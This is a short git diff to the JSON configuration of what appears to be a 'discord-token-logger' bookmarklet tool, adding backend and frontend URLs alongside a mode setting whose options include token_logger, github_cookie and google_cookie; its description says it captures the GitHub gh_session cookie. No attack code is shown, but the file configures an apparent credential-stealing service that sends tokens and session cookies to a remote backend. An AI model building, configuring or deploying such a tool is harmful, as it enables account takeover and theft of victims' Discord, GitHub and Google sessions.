@@ -1,5 +1,7 @@
 {
   "bookmarkletMode": "token_logger",
   "description": "Set to: captcha | token_logger | github_cookie | google_cookie. Current: github_cookie (captures gh_session cookie)",
-  "backendPublicUrl": "https://discord-token-logger-backend.onrender.com"
+  "backendPublicUrl": "https://discord-token-logger-backend.onrender.com",
+  "backendLocalUrl": "http://localhost:8080",
+  "frontendPublicUrl": "https://discord-token-logger-frontend.vercel.app"
 }
